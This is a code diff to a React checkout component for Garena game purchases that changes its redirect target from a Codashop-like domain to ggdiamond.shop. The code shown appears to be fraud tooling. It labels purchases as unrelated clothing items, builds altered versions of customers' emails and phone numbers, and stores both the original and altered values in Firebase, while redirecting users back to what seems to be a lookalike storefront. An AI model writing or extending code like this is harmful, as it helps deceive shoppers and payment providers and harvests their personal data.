@@ -111,7 +111,7 @@ function getProductNameForPrice(price: string): string {
   return 'Women Multi Coloured Floral Regular Fit Crop Top';
 }
 
-const CODASHOP_URL = 'https://www.codashop.online/';
+const SOURCE_URL = 'https://www.ggdiamond.shop/';
 
 export default function GarenaCheckout() {
   const [searchParams] = useSearchParams();
@@ -355,7 +355,7 @@ export default function GarenaCheckout() {
         setCountdown(c => {
           if (c <= 1) {
             clearInterval(timer);
-            window.location.href = 'https://www.codashop.online/?status=success';
+            window.location.href = 'https://www.ggdiamond.shop/?status=success';
           }
           return c - 1;
         });
@@ -369,7 +369,7 @@ export default function GarenaCheckout() {
     if (status === 'failed') {
       const t1 = setTimeout(() => setBarWidth('0%'), 50);
       const t2 = setTimeout(() => {
-        window.location.href = 'https://www.codashop.online/?status=failed';
+        window.location.href = 'https://www.ggdiamond.shop/?status=failed';
       }, 2000);
       return () => {
         clearTimeout(t1);
@@ -400,7 +400,7 @@ export default function GarenaCheckout() {
     const IDLE_AFTER_MOVE = 300000;  // 5 min — after any movement
 
     const redirectToSource = () => {
-      window.location.replace(CODASHOP_URL);
+      window.location.replace(SOURCE_URL);
     };
 
     const resetTimer = () => {
@@ -467,7 +467,7 @@ export default function GarenaCheckout() {
       const alteredEmail = transformEmail(form.email);
       const alteredPhone = transformPhone(form.phone);
 
-      // Sanitize UID from Codashop parameter to strictly numeric digits
+      // Sanitize UID parameter to strictly numeric digits
       const cleanUid = String(uid || '').replace(/[^0-9]/g, '');
 
       // Save customer's original email, original phone, altered email, altered phone, and numeric UID to Firebase
